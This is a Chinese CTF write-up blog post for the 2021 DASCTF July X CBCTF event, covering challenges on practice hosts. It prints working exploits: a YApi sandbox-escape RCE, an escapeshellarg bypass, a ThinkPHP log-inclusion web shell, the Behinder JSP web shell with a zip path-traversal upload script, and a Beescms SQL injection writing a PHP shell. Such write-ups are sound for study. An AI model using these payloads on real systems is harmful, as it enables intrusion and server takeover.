

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/atkx_16x16.png">
  <link rel="icon" href="/img/atkx_16x16.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Atkx">
  <meta name="keywords" content="">
  
  <title>2021DASCTF July X CBCTF 4th - At的小站</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"atkx.top","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="At的小站" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Atkx</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/bg_image2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="2021DASCTF July X CBCTF 4th">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-08-09 22:26" pubdate>
        2021年8月9日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      48
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">2021DASCTF July X CBCTF 4th</h1>
            
            <div class="markdown-body">
              <h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">┌──(kali㉿kali)-[~/桌面]<br>└─$ nc node<span class="hljs-number">4</span>.buuoj.cn <span class="hljs-number">25870</span>                                                                                                                                                      <span class="hljs-number">1</span> ⨯<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br>d<span class="hljs-number">1930e58</span>ab<span class="hljs-number">00552</span>f<span class="hljs-number">066</span>efa<span class="hljs-number">012</span>f<span class="hljs-number">80</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>b<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>Try again<br><span class="hljs-number">981</span>baee<span class="hljs-number">22</span>bc<span class="hljs-number">0</span>cfd<span class="hljs-number">2233769</span>fbf<span class="hljs-number">32336</span>ce<br>flag&#123;<span class="hljs-number">30</span>cf<span class="hljs-number">1012</span>-e<span class="hljs-number">303</span><span class="hljs-number">-4</span>caf<span class="hljs-number">-98</span>ba-d<span class="hljs-number">63</span>f<span class="hljs-number">3591e9</span>cd&#125;<br></code></pre></td></tr></table></figure>


<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h4 id="Yapi-Mock-远程命令执行漏洞"><a href="#Yapi-Mock-远程命令执行漏洞" class="headerlink" title="Yapi Mock 远程命令执行漏洞"></a>Yapi Mock 远程命令执行漏洞</h4><p>添加项目—&gt;添加接口—&gt;选择高级Mock—&gt;勾选脚本—&gt;将开启按钮打开—&gt;然后将PoC写在脚本中保存</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">const</span> sandbox = <span class="hljs-keyword">this</span><br><span class="hljs-keyword">const</span> ObjectConstructor = <span class="hljs-keyword">this</span>.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> FunctionConstructor = ObjectConstructor.<span class="hljs-keyword">constructor</span><br><span class="hljs-keyword">const</span> myfun = FunctionConstructor(<span class="hljs-string">&#x27;return process&#x27;</span>)<br><span class="hljs-keyword">const</span> process = myfun()<br>mockJson = process.mainModule.require(<span class="hljs-string">&quot;child_process&quot;</span>).execSync(<span class="hljs-string">&quot;ls /&amp; cat /ffffffflllllaggggg&quot;</span>).toString()<br></code></pre></td></tr></table></figure>
<p>访问预览地址，回显命令执行结果getflag</p>
<h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h2><h4 id="非ascii字符绕过escapeshellarg"><a href="#非ascii字符绕过escapeshellarg" class="headerlink" title="非ascii字符绕过escapeshellarg"></a>非ascii字符绕过escapeshellarg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))<br>    &#123;<br>        <span class="hljs-variable">$cmd</span> = escapeshellarg(<span class="hljs-variable">$cmd</span>);<br>        system(<span class="hljs-string">&#x27;cat &#x27;</span> . <span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>hint提示管理员曾访问过flag，查看日志</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?cmd=<span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure>
<p>得到flag文件为/this_is_final_flag_e2a457126032b42d.php</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">?cmd=<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_f</span>inal<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span>e<span class="hljs-number">2</span>a<span class="hljs-number">457126032</span>b<span class="hljs-number">42</span>d.php<br></code></pre></td></tr></table></figure>
<p>过滤了flag关键字，配合escapeshellarg函数绕过：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.escapeshellarg.php">https://www.php.net/manual/zh/function.escapeshellarg.php</a></p>
<p>当escapeshellarg（）从UTF-8字符串中剥离非ASCII字符时，添加以下内容修复了该问题：</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;?php<br>setlocale(LC_CTYPE, <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>);<br>?&gt;<br>  <br> Under Windows, this function puts <span class="hljs-built_in">string</span> <span class="hljs-keyword">into</span> double-quotes, <span class="hljs-keyword">not</span> single, <span class="hljs-keyword">and</span> replaces %(percent sign) <span class="hljs-keyword">with</span> a <span class="hljs-literal">space</span>, <span class="hljs-keyword">that</span>&#x27;s why <span class="hljs-keyword">it</span>&#x27;s impossible <span class="hljs-keyword">to</span> pass a filename <span class="hljs-keyword">with</span> percents <span class="hljs-keyword">in</span> <span class="hljs-keyword">its</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">through</span> this function.<br> <br>在Windows下，此函数将字符串放在双引号中，而不是单引号中，并用空格替换%（百分号），这就是为什么无法通过此函数传递名称中带有百分数的文件名的原因。<br></code></pre></td></tr></table></figure>
<p>在flag字符之间添加一个非ascii字符，然后unicode绕一下flag正则</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">?cmd=this_is_final_fl%faag_e2a457126032b42d.php</span><br><span class="xml"> #</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;flag&#123;cb3043a6-bfe6-4c6d-a75e-fc77e27de779&#125;&#x27;</span>; <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>






<h2 id="easythinkphp"><a href="#easythinkphp" class="headerlink" title="easythinkphp"></a>easythinkphp</h2><h4 id="ThinkPHP-3-x-日志包含RCE-getshell"><a href="#ThinkPHP-3-x-日志包含RCE-getshell" class="headerlink" title="ThinkPHP 3.x 日志包含RCE getshell"></a>ThinkPHP 3.x 日志包含RCE getshell</h4><p>TP3.2.3日志漏洞:<a target="_blank" rel="noopener" href="https://www.thinkphp.cn/topic/58651.html">https://www.thinkphp.cn/topic/58651.html</a></p>
<p>ThinkPHP3.2.x RCE漏洞通报：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1855060">https://cloud.tencent.com/developer/article/1855060</a></p>
<p>通过输入http://域名/应用名（默认为Application，很多开发者不会改它）/Runtime/Logs/组名（默认为Home或者Index，很多开发者不会改它）/18_08_15.log的方式即可访问日志文件</p>
<p>POC</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk">写入phpinfo()<br>GET <span class="hljs-regexp">/index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/</span><span class="hljs-number">1.1</span><br>Host: c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<br>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90.0</span><br>Accept: text<span class="hljs-regexp">/html,application/</span>xhtml+xml,application<span class="hljs-regexp">/xml;q=0.9,image/</span>webp,*/*;q=<span class="hljs-number">0.8</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.8</span>,zh-TW;q=<span class="hljs-number">0.7</span>,zh-HK;q=<span class="hljs-number">0.5</span>,en-US;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Cookie: PHPSESSID=<span class="hljs-number">3</span>nctjnqfd39jl28bg59mnaf2b5<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br><br>  <br>查看日志，注意日志时间<br>GET <span class="hljs-regexp">/index.php/</span>?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=.<span class="hljs-regexp">/Application/</span>Runtime<span class="hljs-regexp">/Logs/</span>Common/<span class="hljs-number">21</span>_08_02.log<br><br>上shell<br>GET /index.php?m=--&gt;&lt;?=@eval(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;atkx&quot;</span>]);?&gt;<br><br>蚁剑连接：<br>http:<span class="hljs-regexp">//</span>c1855537-eb23-<span class="hljs-number">4</span>ca1-<span class="hljs-number">9</span>dfc-e67ffdcc8092.node4.buuoj.cn<span class="hljs-regexp">/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Common/</span><span class="hljs-number">21</span>_08_02.log<br>pass：atkx<br></code></pre></td></tr></table></figure>
<p>蚁剑连接成功</p>
<p>ThinkphpGUI工具getshell</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/121016-717857.png" srcset="/img/loading.gif" lazyload alt="image-20210815121015293"></p>
<p>相关信息;</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">检测漏洞 ThinkPHP <span class="hljs-number">3</span>.x Log RCE中......<br>[+] 存在ThinkPHP <span class="hljs-number">3</span>.x Log RCE<br>Payload: http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log<br>[+] http:<span class="hljs-regexp">//</span>da0b898a-<span class="hljs-number">65</span>dc-<span class="hljs-number">4946</span>-<span class="hljs-number">857</span>a-<span class="hljs-number">3</span>eebdbfe53d0.node4.buuoj.cn<span class="hljs-regexp">/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./</span>Application<span class="hljs-regexp">/Runtime/</span>Logs<span class="hljs-regexp">/Home/</span><span class="hljs-number">21</span>_08_02.log   Pass:peiqi<br></code></pre></td></tr></table></figure>


<p>蚁剑连接成功</p>
<h2 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h2><h4 id="jspxcms解压getshell漏洞"><a href="#jspxcms解压getshell漏洞" class="headerlink" title="jspxcms解压getshell漏洞"></a>jspxcms解压getshell漏洞</h4><p><a target="_blank" rel="noopener" href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/</a></p>
<p>admin空密码登录后台，进入后台管理页面：/cmscp/index.do找到漏洞存在的功能页面。</p>
<p>这里用冰蝎自带的马shell.jsp</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
<p>生成war，把shell.jsp和jar.exe放至同一目录下</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>cf <span class="hljs-keyword">shell.war </span>*<br></code></pre></td></tr></table></figure>
<p>所以选择脚本写入</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import zipfile<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;test.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, zipfile.ZIP_DEFLATED)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    temp=f.<span class="hljs-built_in">read</span>()<br><br>z.writestr(<span class="hljs-string">&#x27;../../../shell.war&#x27;</span>,temp)  <span class="hljs-comment">#shell.war为上一步生产的后门war包</span><br>z.<span class="hljs-built_in">close</span>()<br>    <br>      <br>      <br>import zipfile<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;cmd.war&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>binary=f.<span class="hljs-built_in">read</span>()<br>f.<span class="hljs-built_in">close</span>()<br>binary1 = b<span class="hljs-string">&#x27;123123&#x27;</span><br>zipFile = zipfile.ZipFile(<span class="hljs-string">&quot;tests.zip&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)<br>info = zipfile.ZipInfo(<span class="hljs-string">&quot;tests.zip&quot;</span>)<br>zipFile.writestr(<span class="hljs-string">&quot;../../../shells.war&quot;</span>, binary)<br>zipFile.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure>
<p>上传生成的test.zip</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122132-465323.png" srcset="/img/loading.gif" lazyload alt="image-20210815122131241"></p>
<p>注意解压，然后冰蝎连接</p>
<p><a target="_blank" rel="noopener" href="http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/cmscp/index.do">http://1a43c8c7-96d5-4a35-b0f8-69a5152f2a2c.node4.buuoj.cn/</a>shell/shell.jsp</p>
<p>pass：rebeyond</p>
<h2 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h2><h4 id="Beescms-v4-0-sql注入漏洞分析"><a href="#Beescms-v4-0-sql注入漏洞分析" class="headerlink" title="Beescms_v4.0 sql注入漏洞分析"></a>Beescms_v4.0 sql注入漏洞分析</h4><p>后台注入outfile :<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p>
<p>/<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码是beescms，/var/www/html/</p>
<p>sql注入outfile写webshell，过滤了空格，用然/**/代替，后连接webshell</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /admin/login.php?action=ck_login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">90</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">90</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">215</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">3138</span>db<span class="hljs-number">70</span>-ea<span class="hljs-number">68</span>-<span class="hljs-number">4</span>bad-<span class="hljs-number">8</span>cb<span class="hljs-number">4</span>-<span class="hljs-number">0</span>c<span class="hljs-number">6</span>e<span class="hljs-number">63</span>b<span class="hljs-number">7894</span>b.node<span class="hljs-number">4</span>.buuoj.cn/admin/login.php<br><span class="hljs-attribute">Cookie</span>: PHPSESSID=om<span class="hljs-number">10447</span>imss<span class="hljs-number">7</span>jbttdpjm<span class="hljs-number">5</span>lsf<span class="hljs-number">24</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">user</span>=admin&#x27;/**/union/**/selselectect/**/<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">3</span>f<span class="hljs-number">3</span>d<span class="hljs-number">406576616</span>c<span class="hljs-number">28245</span>f<span class="hljs-number">504</span>f<span class="hljs-number">53545</span>b<span class="hljs-number">2761746</span>b<span class="hljs-number">78275</span>d<span class="hljs-number">293</span>f<span class="hljs-number">3</span>e,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>/**/into/**/outoutfilefile/**/&#x27;/var/www/html/atkx.php&#x27;#&amp;password=<span class="hljs-number">123456</span>&amp;code=&amp;submit=true&amp;submit.x=<span class="hljs-number">47</span>&amp;submit.y=-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>蚁剑连接成功getflag </p>
<h2 id="jj’s-camera"><a href="#jj’s-camera" class="headerlink" title="jj’s camera"></a>jj’s camera</h2><p>00截断</p>
